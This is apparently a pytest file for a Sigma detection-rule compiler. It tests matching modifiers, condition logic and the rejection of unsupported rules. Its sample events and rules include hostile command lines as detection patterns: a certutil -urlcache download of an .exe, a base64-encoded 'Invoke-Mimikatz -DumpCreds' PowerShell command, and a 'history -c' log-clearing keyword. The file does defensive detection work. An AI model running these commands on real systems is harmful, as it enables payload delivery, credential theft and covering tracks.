"""Compiler tests: every supported modifier and condition form, and unsupported features raise."""

from __future__ import annotations

import pytest
from sigma.collection import SigmaCollection
from sigma.exceptions import SigmaError

from tripline.engine.compiler import UnsupportedRuleError, compile_rule

WIN = {
    "Image": r"C:\Windows\System32\certutil.exe",
    "CommandLine": "certutil -urlcache -split -f http://x/a.exe a.exe",
    "User": "bob",
}


# --------------------------------------------------------------------------- modifiers


def test_plain_equals_is_case_insensitive(make_rule):
    rule = make_rule("sel:\n  User: BOB\ncondition: sel")
    assert rule.matches(WIN)
    assert not rule.matches({**WIN, "User": "alice"})


def test_contains(make_rule):
    rule = make_rule("sel:\n  CommandLine|contains: '-URLCACHE'\ncondition: sel")
    assert rule.matches(WIN)
    assert not rule.matches({**WIN, "CommandLine": "certutil -hashfile a"})


def test_startswith_and_endswith(make_rule):
    starts = make_rule("sel:\n  Image|startswith: 'c:\\windows'\ncondition: sel")
    ends = make_rule("sel:\n  Image|endswith: '\\certutil.exe'\ncondition: sel")
    assert starts.matches(WIN) and ends.matches(WIN)
    assert not ends.matches({**WIN, "Image": r"C:\certutil.exe.bak"})


def test_contains_all_requires_every_value(make_rule):
    rule = make_rule(
        "sel:\n  CommandLine|contains|all:\n    - urlcache\n    - split\ncondition: sel"
    )
    assert rule.matches(WIN)
    assert not rule.matches({**WIN, "CommandLine": "certutil -urlcache only"})


def test_contains_list_is_any_of(make_rule):
    rule = make_rule(
        "sel:\n  CommandLine|contains:\n    - bitsadmin\n    - urlcache\ncondition: sel"
    )
    assert rule.matches(WIN)


def test_re_is_case_sensitive_unless_flagged(make_rule):
    plain = make_rule("sel:\n  CommandLine|re: 'URLCACHE'\ncondition: sel")
    flagged = make_rule("sel:\n  CommandLine|re|i: 'URLCACHE'\ncondition: sel")
    assert not plain.matches(WIN)
    assert flagged.matches(WIN)


def test_re_search_semantics(make_rule):
    rule = make_rule(r"sel:" "\n" r"  CommandLine|re: 'http://[a-z]+/\w+\.exe'" "\ncondition: sel")
    assert rule.matches(WIN)


def test_windash_matches_slash_and_dash_variants(make_rule):
    rule = make_rule("sel:\n  CommandLine|windash|contains: ' -urlcache '\ncondition: sel")
    assert rule.matches(WIN)
    assert rule.matches({**WIN, "CommandLine": "certutil /urlcache /f http://x/a.exe"})
    assert rule.matches(
        {**WIN, "CommandLine": "certutil \u2013urlcache /f http://x/a.exe"}
    )  # en dash
    assert not rule.matches({**WIN, "CommandLine": "certutil urlcache"})


def test_base64offset_matches_any_alignment(make_rule):
    import base64

    rule = make_rule("sel:\n  CommandLine|base64offset|contains: 'Invoke-Mimikatz'\ncondition: sel")
    for prefix in ("", "A", "AB"):
        payload = (prefix + "Invoke-Mimikatz -DumpCreds").encode("utf-8")
        encoded = base64.b64encode(payload).decode()
        assert rule.matches({**WIN, "CommandLine": f"powershell -enc {encoded}"}), prefix
    assert not rule.matches({**WIN, "CommandLine": "powershell -enc QUJD"})


def test_cidr(make_rule):
    rule = make_rule(
        "sel:\n  sourceIPAddress|cidr: 10.0.0.0/8\ncondition: sel",
        logsource="product: aws\nservice: cloudtrail",
    )
    assert rule.matches({"sourceIPAddress": "10.20.30.40"})
    assert not rule.matches({"sourceIPAddress": "192.168.1.1"})
    assert not rule.matches({"sourceIPAddress": "not-an-ip"})


def test_wildcards_in_plain_values(make_rule):
    # In Sigma a backslash escapes a following wildcard, so '*\certutil' is wildcard + literal '\c'.
    rule = make_rule("sel:\n  Image: '*\\certutil.e?e'\ncondition: sel")
    assert rule.matches(WIN)
    assert not rule.matches({**WIN, "Image": r"C:\certutil.exe.bak"})


def test_null_and_exists(make_rule):
    null_rule = make_rule("sel:\n  errorCode: null\ncondition: sel", logsource="product: aws")
    exists_rule = make_rule(
        "sel:\n  errorCode|exists: true\ncondition: sel", logsource="product: aws"
    )
    assert null_rule.matches({"eventName": "x"})
    assert null_rule.matches({"eventName": "x", "errorCode": None})
    assert not null_rule.matches({"eventName": "x", "errorCode": "AccessDenied"})
    assert exists_rule.matches({"errorCode": "AccessDenied"})
    assert not exists_rule.matches({"eventName": "x"})


def test_numeric_and_comparison(make_rule):
    eq = make_rule(
        "sel:\n  EventID: 4698\ncondition: sel", logsource="product: windows\nservice: security"
    )
    gt = make_rule("sel:\n  Count|gt: 5\ncondition: sel", logsource="product: windows")
    assert eq.matches({"EventID": 4698}) and eq.matches({"EventID": "4698"})
    assert not eq.matches({"EventID": 4699})
    assert gt.matches({"Count": 6}) and not gt.matches({"Count": 5})


def test_fieldref_contains(make_rule):
    rule = make_rule(
        "sel:\n  userIdentity.arn|fieldref|contains: responseElements.accessKey.userName\ncondition: sel",
        logsource="product: aws\nservice: cloudtrail",
    )
    same = {
        "userIdentity": {"arn": "arn:aws:iam::1:user/bob"},
        "responseElements": {"accessKey": {"userName": "bob"}},
    }
    other = {
        "userIdentity": {"arn": "arn:aws:iam::1:user/bob"},
        "responseElements": {"accessKey": {"userName": "mallory"}},
    }
    assert rule.matches(same)
    assert not rule.matches(other)


def test_nested_field_through_list(make_rule):
    rule = make_rule(
        "sel:\n  requestParameters.Grant.Grantee.URI|endswith: '/AllUsers'\ncondition: sel",
        logsource="product: aws\nservice: cloudtrail",
    )
    event = {
        "requestParameters": {
            "Grant": [
                {"Grantee": {"ID": "abc"}},
                {"Grantee": {"URI": "http://acs.amazonaws.com/groups/global/AllUsers"}},
            ]
        }
    }
    assert rule.matches(event)
    assert not rule.matches({"requestParameters": {"Grant": [{"Grantee": {"ID": "abc"}}]}})


def test_keyword_search_scans_every_leaf(make_rule):
    rule = make_rule("keywords:\n  - 'history -c'\ncondition: keywords", logsource="product: linux")
    assert rule.matches(
        {"type": "PROCTITLE", "proctitle": "bash -c history -c", "nested": {"x": 1}}
    )
    assert not rule.matches({"type": "PROCTITLE", "proctitle": "ls -la"})


# --------------------------------------------------------------------------- conditions


def test_and_or_not_with_parentheses(make_rule):
    rule = make_rule(
        "a:\n  User: bob\nb:\n  User: alice\nc:\n  CommandLine|contains: hashfile\ncondition: (a or b) and not c"
    )
    assert rule.matches(WIN)
    assert rule.matches({**WIN, "User": "alice"})
    assert not rule.matches({**WIN, "CommandLine": "certutil -hashfile x"})
    assert not rule.matches({**WIN, "User": "carol"})


def test_one_of_wildcard(make_rule):
    rule = make_rule("sel_a:\n  User: bob\nsel_b:\n  User: alice\ncondition: 1 of sel_*")
    assert rule.matches(WIN)
    assert rule.matches({**WIN, "User": "alice"})
    assert not rule.matches({**WIN, "User": "carol"})


def test_all_of_wildcard(make_rule):
    rule = make_rule(
        "sel_a:\n  User: bob\nsel_b:\n  CommandLine|contains: urlcache\ncondition: all of sel_*"
    )
    assert rule.matches(WIN)
    assert not rule.matches({**WIN, "User": "alice"})


def test_one_of_them(make_rule):
    rule = make_rule("x:\n  User: nobody\ny:\n  User: bob\ncondition: 1 of them")
    assert rule.matches(WIN)


def test_list_of_maps_selection_is_or(make_rule):
    rule = make_rule(
        "sel:\n  - Image|endswith: '\\wmic.exe'\n  - OriginalFileName: 'certutil.exe'\ncondition: sel"
    )
    assert rule.matches({**WIN, "OriginalFileName": "certutil.exe"})
    assert not rule.matches(WIN)


def test_multiple_conditions_are_or(make_rule):
    rule = make_rule("a:\n  User: alice\nb:\n  User: bob\ncondition:\n  - a\n  - b")
    assert rule.matches(WIN)


def test_techniques_extracted_from_tags():
    rule = SigmaCollection.from_yaml(
        """
        title: t
        id: 11111111-2222-3333-4444-555555555555
        tags: [attack.execution, attack.t1059.001, attack.t1105, car.2016-03-002]
        logsource: {product: windows}
        detection:
          sel: {User: bob}
          condition: sel
        """
    ).rules[0]
    assert compile_rule(rule).techniques == ("T1059.001", "T1105")


# --------------------------------------------------------------------------- unsupported


def _rule(yaml_text: str):
    return SigmaCollection.from_yaml(yaml_text).rules[0]


def test_rule_without_id_is_rejected():
    rule = _rule(
        "title: t\nlogsource: {product: windows}\ndetection:\n  sel: {User: bob}\n  condition: sel\n"
    )
    with pytest.raises(UnsupportedRuleError, match="no id"):
        compile_rule(rule)


def test_placeholder_without_pipeline_is_rejected():
    rule = _rule(
        "title: t\nid: 11111111-2222-3333-4444-555555555555\nlogsource: {product: windows}\n"
        "detection:\n  sel:\n    User|expand: '%admins%'\n  condition: sel\n"
    )
    with pytest.raises(UnsupportedRuleError, match="placeholder"):
        compile_rule(rule)


def test_aggregation_condition_is_rejected():
    rule = _rule(
        "title: t\nid: 11111111-2222-3333-4444-555555555555\nlogsource: {product: windows}\n"
        "detection:\n  sel: {User: bob}\n  condition: sel | count() > 5\n"
    )
    with pytest.raises((UnsupportedRuleError, SigmaError)):
        compile_rule(rule)


def test_near_condition_is_rejected():
    rule = _rule(
        "title: t\nid: 11111111-2222-3333-4444-555555555555\nlogsource: {product: windows}\n"
        "detection:\n  a: {User: bob}\n  b: {User: alice}\n  condition: a | near b\n"
    )
    with pytest.raises((UnsupportedRuleError, SigmaError)):
        compile_rule(rule)
